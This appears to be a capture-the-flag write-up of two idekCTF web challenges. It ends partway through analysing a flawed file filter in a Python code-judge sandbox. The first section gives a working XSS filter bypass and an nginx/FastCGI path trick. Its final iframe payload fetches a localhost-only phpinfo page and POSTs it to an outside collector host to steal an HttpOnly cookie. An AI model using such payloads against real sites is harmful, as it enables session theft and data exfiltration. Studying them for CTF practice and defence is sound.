You can dowload the source code <a href="https://idekctf-challenges.storage.googleapis.com/uploads/f64f1dd16fae27e943a8f7dab349e00509f39c63bb2278328ac5783d867fa393/idek-hello.tar.gz">here</a>

- **Admin Bot:** <a href="https://admin-bot.idek.team/idek-hello">https://admin-bot.idek.team/idek-hello</a>

It gives us a blank page so let's take a look through the source code

### **ENUMURATION**

- Index.php

```php
<?php


function Enhanced_Trim($inp) {
    $trimmed = array("\r", "\n", "\t", "/", " ");
    return str_replace($trimmed, "", $inp);
}


if(isset($_GET['name']))
{
    $name=substr($_GET['name'],0,23);
    echo "Hello, ".Enhanced_Trim($_GET['name']);
}

?>

```

In the `index.php` file, the name parameter is sanitized using the `Enhanced_Trim($inp)` function. Although there’s a substring function at line 12 meant to limit input, it’s not active, so we can ignore it.

At line 13, the input is appended directly to "hello," indicating a potential XSS vulnerability. The `Enhanced_Trim($inp)` function trims whitespace and forward slashes, but you can bypass it by using `%0C` for whitespace and `%26%2347%3B` for forward slashes.

`%0C`: a URL-encoded representation of the form feed character ASCII code 12

`%26%2347%3B`:

```plaintext
Let's split to 3 different parts

%26: Decodes &
%23: Decodes #
%3B: Decodes ;

So, %26%2347%3B translates to &#47; in HTML, which is the HTML entity for the forward slash (/).
```

Using `<svg%0Csrc="alert(1)">`, we have got XSS

- Bot.js

```javascript

puppeteer = require("puppeteer");
const sleep = d => new Promise(r => setTimeout(r, d));

const visit = async () => {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: true,
            pipe: true,
            args: [
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--js-flags=--noexpose_wasm,--jitless",
            ],
            dumpio: true
        });

        const ctx = await browser.createBrowserContext();

        const page = await ctx.newPage();
        await page.goto(CHALLENGE_ORIGIN, { timeout: 3000 });
        await page.setCookie({ name: 'FLAG', value: 'idek{PLACEHOLDER}', httpOnly: true });
        await page.goto(TARGET_URL, { timeout: 3000, waitUntil: 'domcontentloaded' });
        await sleep(5000);

```

`Puppeteer:` is a library used to control a headless browser (without a GUI). The `Bot.js` file functions as a bot, simulating the behavior of an admin bot for a challenge.

In the script, the `FLAG` is stored in a cookie, but it cannot be accessed using `document.cookie` because the `HttpOnly` attribute is set to true.(Line 23)

`HttpOnly:` Tt restricts client-side access to that cookie, preventing JavaScript from accessing it through document.cookie. This security feature is designed to mitigate the risk of cross-site scripting (XSS) attacks, where an attacker might try to steal session cookies or other sensitive information. With HttpOnly enabled, only the server can access the cookie, making it inaccessible to scripts running in the browser.

So, how do we get the flag? Let's dig deeper at `Info.php` file and `Nginx Configuration` file.

- Info.php

```php
<?php
phpinfo();
?>
```

- Nginx.conf

```nginx
location = /info.php {
    allow 127.0.0.1;
    deny all;
    }

    location ~ \.php$ {
    root           /usr/share/nginx/html;
    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
    include fastcgi_params;
    fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
    }
```

Let's dive into the `Nginx Configuration` file.
This config file contains two location blocks, each serving a different purpose.

```nginx
location = /info.php {
    allow 127.0.0.1;
    deny all;
    }
```

The block specificfically targets requests to `/info.php`. This only allow localhost to access `/info.php`. Any IP other than `127.0.0.1`, they will receive a `403 Forbidden` response.

```nginx
location ~ \.php$ {
    root           /usr/share/nginx/html;
    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
    include fastcgi_params;
    fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
    }
```

This block matches any request for a PHP file (indicated by the regex `~ \.php`, where `~` is a case-sensitive regular expression). We also notice that it used `Fastcgi`.

After a while of researching, I encounted 2 sites that have alike this problem.
For more details:<br>
<a href="https://nealpoole.com/blog/2011/04/setting-up-php-fastcgi-and-nginx-dont-trust-the-tutorials-check-your-configuration/">Setting up PHP-FastCGI and nginx? Don’t trust the tutorials: check your configuration!</a><br>

<a href="https://www.linode.com/docs/guides/nginx-and-phpfastcgi-on-fedora-14/#configure-your-site">Configure FastCGI</a><br>

Basically, the `conf` file processes one block at a time. For instance, a request like `http://idek-hello.chal.idek.team:1337/info.php/.php` triggers the second block because it ends with `.php`, bypassing the first block. This results in the execution of the script inside the `/info.php`.

### **EXPLOITATION**

With all the information that we gathered, let's craft the final payload.

```plaintext
<iframe src="javascript:fetch('/info.php/.php').then(r=>r.text()).then(x=>{fetch('http://tr0x69.free.beeceptor.com',{method:'POST',body:x})})">
```

Because it has the same origin, so we just need to fetch `/info.php/.php`

Encoded version

```plaintext
<iframe%0Csrc=%22javascript:fetch('%26%2347%3Binfo.php%26%2347%3B.php').then(r=>r.text()).then(x=>{fetch(%27https:%26%2347%3B%26%2347%3Btr0x69.free.beeceptor.com%27,{method:%27POST%27,body:x});})%22>
```

Inspect the body, and I have gotton the flag!!!!

### **DESCRIPTION**

### **ENUMURATION**

Here's a brief breakdown of its functtionality

- `User Management`: users can register and login.

  <img src="./assets/IDEK-CTF/login.png" alt="Ảnh 2" style="width:100%;">

- `Problem Management`: users can view problem details and submit solutions. There are 2 problems `Hello, World!`, and `Hello, Input`. Let's try the first problem.

  <img src="./assets/IDEK-CTF/problems.png" alt="Ảnh 2" style="width:100%;"><br>

  <img src="./assets/IDEK-CTF/submit.png" alt="Ảnh 2" style="width:100%;"><br>

- `Submission`: Result of user submitted code.

  <img src="./assets/IDEK-CTF/result.png" alt="Ảnh 2" style="width:100%;"><br>

After playing around with this website, we could know this application serves as a basic platform for submiting and evaluating code challeges.

To have a better standing, let's look over the source code.

This web application is developed in Python using the Flask framework and employs SQLAlchemy as the ORM.
There are overall 3 importants files: `App.py`, `Db.py`, and `db.sqlite`.

One of my strageries for uncovering flags in CTF challenges is to trace the flag from the start. Let's find the flag.

```python
with Session(engine) as db:
    flag = os.environ.get("FLAG")
    if flag:
        flag_case = db.scalar(select(ProblemTestCase).filter_by(problem_id="helloinput", hidden=True))
        # flag_case.input = flag
        flag_case.output = flag + "\n"
        db.commit()

```

The code above is designed to retrieve the `ProblemTestCase` table and fetch test cases associated with the `helloinput` problem as show in the image provided.

Let's do the second problem.

<img src="./assets/IDEK-CTF/second.png" alt="Ảnh 2" style="width:100%;"><br>

<img src="./assets/IDEK-CTF/input.png" alt="Ảnh 2" style="width:100%;"><br>

It returned me 2 output. Both get accepted, but one is hidden. One output is `Welcome to Crator`. I wonder why? Let's check the table.

```sql
class ProblemTestCase(Base):
    __tablename__ = 'problem_test_cases'
    id: int = Column(Integer, primary_key=True)
    problem_id: str = Column(String, ForeignKey('problems.id'))
    input: str = Column(String)
    output: str = Column(String)
    hidden: bool = Column(Integer)
```

Ahhhhh, I see. The `input` is provided by the database, there is also a column named `hidden` which has `boolean` datatype.

In summary, there are two test cases for the `helloinput` problem. The input for the first test case is `Welcome to Crator`, while the second test case's input could potentially be the flag, as it's marked as hidden. Let's examine the application's logic to understand why this is the case.

There are total 8 routes in `app.py`. However, there one route that got my attention which is `'/submit/<problem_id>', methods=['GET', 'POST']`.

```python
@app.route('/submit/<problem_id>', methods=['GET', 'POST'])
@login_required
def submit(problem_id):
    with Session(engine) as db:
        # Select problem
        problem = db.scalar(select(Problem).filter_by(id=problem_id))
        if not problem:
            abort(404)
        if request.method == 'GET':
            return render_template('submit.html', problem=problem)

        # Get testcases, code, sandbox
        testcases = db.scalars(select(ProblemTestCase).filter_by(problem_id=problem_id)).all()
        code = request.form['code']
        if len(code) > 32768:
            return abort(400)
        with open('sandbox.py', 'r') as f:
            sandbox = f.read()


```

- Fetches the problems details from the `Problem` table using provided `problem_id`.
- Retrieves all test cases associateed with the problem.
- Retrieves the submitted code from the form
- Checks if the submitted code exceeds `32,768` characters and aborts the request with a 400 error if it does.

```python
submission = Submission(problem_id=problem_id, user_id=session['user_id'], code=code, status='Pending')
        db.add(submission)
        db.commit()
        submission_id = submission.id

        # Prepare code
        shutil.copy('sandbox.py', f'/tmp/sandbox.py')
        with open(f'/tmp/{submission_id}.py', 'w') as f:
            f.write(f'__import__("sandbox").Sandbox("{submission_id}")\n' + code.replace('\r\n', '\n'))

```

- A new `submission` object is created with the given `problem_id`, the `user ID` from the session, the submitted `code`, and an initial status of 'Pending'. This object is added to the database.
- A new file named `submission_id` is created in the temporary directory. The file will import the `Sandbox` class, followed by the user-submitted code.

```python
# Run testcases
skip_remaining_cases = False
for testcase in testcases:
    # Set testcase staus
    submission_case = SubmissionOutput(submission_id=submission_id, testcase_id=testcase.id, status='Pending')
    db.add(submission_case)
    if skip_remaining_cases:
        submission_case.status = 'Skipped'
        db.commit()
        continue

    if not testcase.hidden:
        submission_case.expected_output = testcase.output
    # Set up input and output files
    with open(f'/tmp/{submission_id}.in', 'w') as f:
        f.write(testcase.input.replace('\r\n', '\n'))
    with open(f'/tmp/{submission_id}.expected', 'w') as f:
        f.write(testcase.output.replace('\r\n', '\n'))

```

- `skip_remaining_cases` is set to False to control whether to skip subsequent test cases.
- Iterate Over Each Test Cases.
  - For each test case, a new `SubmissionOutput` object is created. This object tracks the status of the submission for the specific test case.
  - The status of the submission case is initially set to `Pending`.
  - If the test case is not marked as hidden, the expected output of the test case is set. (So here is why our flag got hidden)(line 13).
  - Notice here that whether the test case is hidden or not, the program will store the test case's input and expected output in files with extensions `.in` and `.expected`.

```python

try:
                proc = subprocess.run(f'sudo -u nobody -g nogroup python3 /tmp/{submission_id}.py < /tmp/{submission_id}.in > /tmp/{submission_id}.out', shell=True, timeout=1)
                if proc.returncode != 0:
                    submission.status = 'Runtime Error'
                    skip_remaining_cases = True
                    submission_case.status = 'Runtime Error'
                else:
                    diff = subprocess.run(f'diff /tmp/{submission_id}.out /tmp/{submission_id}.expected', shell=True, capture_output=True)
                    if diff.stdout:
                        submission.status = 'Wrong Answer'
                        skip_remaining_cases = True
                        submission_case.status = 'Wrong Answer'
                    else:
                        submission_case.status = 'Accepted'
            except subprocess.TimeoutExpired:
                submission.status = 'Time Limit Exceeded'
                skip_remaining_cases = True
                submission_case.status = 'Time Limit Exceeded'
```

This code is executing our python script and checking its output against expected results as part of an automated testing.

The command redirects the contents of the input file `/tmp/{submission_id}.in` to the script and writes the output to `/tmp/{submission_id}.out`
The `timeout = 1` parameter limits the script's execution time to 1 second. If it takes longer, `TimeoutExpired` exception is raised.
Here at line 9, in this case, we just need to worry about the succesfully cases, the code compares the actual output `/tmp/{submission_id}.out` with the expected output `/tmp/{submission_id}.expected` using `diff` command. If there is any difference (`diff.stdout` is not empty), it means the output is incorrect and status is updated to Wrong Answer.

Given that the test case output (`.expected`) is always written to a file, we could potentially find a way to read that file. Fortunately, in the `Sandbox`, I discovered this piece of code that enables us to do just that.

```python

def _safe_open(open, submission_id):
    def safe_open(file, mode="r"):
        if mode != "r":
            raise RuntimeError("Nein")
        file = str(file)
        if file.endswith(submission_id + ".expected"):
            raise RuntimeError("Nein")
        return open(file, "r")

    return safe_open

```

Even though the file name must not ends with `<submission_id>.expected`, this implementation is flawed, as it only checks the current `submission_id` instead of all the filenames that ends with `.expected`. Why? Let's look through the Submission table and where the submission_id comming from.

```sql
class Submission(Base):
    __tablename__ = 'submissions'
    id: int = Column(Integer, primary_key=True)
    problem_id: str = Column(String, ForeignKey('problems.id'))
    user_id: int = Column(Integer, ForeignKey('users.id'))
    code: str = Column(String)
    status: str = Column(String)
```

```python
 submission = Submission(problem_id=problem_id, user_id=session['user_id'], code=code, status='Pending')
 submission_id = submission.id
```

By default, `SQLAlchemy` auto-generates the primary key for the `id` field if we don't manually specify it when creating a new Submission instance.
